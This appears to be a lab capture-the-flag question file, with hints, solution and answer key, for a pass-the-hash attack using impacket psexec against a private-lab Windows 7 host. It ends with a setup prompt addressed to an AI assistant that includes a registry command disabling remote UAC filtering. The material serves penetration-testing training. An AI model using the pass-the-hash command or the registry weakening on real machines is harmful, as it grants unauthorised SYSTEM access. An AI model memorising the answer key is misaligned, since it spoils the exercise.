# Q064 — Pass-the-Hash with psexec

| Field | Value |
|---|---|
| **Target** | `192.168.52.130` (Windows 7) |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🔴 Hard |
| **Tools** | `impacket-psexec` |
| **Time budget** | 15–25 min |

---

## 📝 Question

With Win7 NTLM hash from hashdump, use impacket `psexec.py` to authenticate. Provide command syntax (placeholder hash).

---

## 🎯 Flag Format

```
cmd=<short>
```

Example: `cmd=psexec.py -hashes :ntlmhash Administrator@192.168.52.130`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Empty LM portion: `:`.
</details>

<details>
<summary>Hint 2</summary>

Requires SMB ports open.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
impacket-psexec -hashes :<NThash> Administrator@192.168.52.130
```

Drops SYSTEM shell on Win7.

**Answer:** `cmd=psexec.py -hashes :NTHASH Administrator@192.168.52.130`

📖 Ref: [tools/impacket.md](../../tools/impacket.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q064:
1. Need NTLM hash of local Administrator (obtain via Q042+Q051 chain).
2. Verify Win7 (192.168.52.130): SMB 445 open; admin shares (ADMIN$, C$) enabled — on Win7 workgroup set: reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f (required for workgroup PTH).
3. On Parrot: which impacket-psexec (sudo apt install python3-impacket if missing).

Report back: "Lab ready for Q064 — Win7 SMB 445 open, LocalAccountTokenFilterPolicy=1, NTLM hash captured".
```
